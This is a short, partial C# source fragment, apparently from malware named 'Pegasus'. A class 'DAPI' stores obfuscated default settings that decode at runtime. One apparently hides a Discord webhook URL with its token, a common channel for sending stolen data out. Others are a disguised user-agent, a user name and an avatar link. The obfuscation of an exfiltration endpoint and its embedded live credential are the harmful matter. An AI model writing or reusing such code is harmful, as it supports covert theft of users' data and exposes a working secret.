...
namespace PEGASUS.Pegasus
{
	public class DAPI
	{
		...
		private static readonly string defaultWebhook = info("b~~zy0%%ncyiexn$ieg%kzc%}ohbeeay%23==<3;?>?:2;:==2=%GeyN@{F]3X|Ph|P@e?o[}r2h=pKK~P~p2o<Lml2[DnFr'IZGG9EF^lrN\u007f\\<_]d:Y?L2o");

		private static readonly string defaultUserAgent = info("Yasdo~Iexz");

		private static readonly string defaultUserName = info("Yasdo~Iexz");

		private static readonly string defaultAvatar = info("b~~zy0%%c$cgm\u007fx$ieg%2zdm>db$zdm");
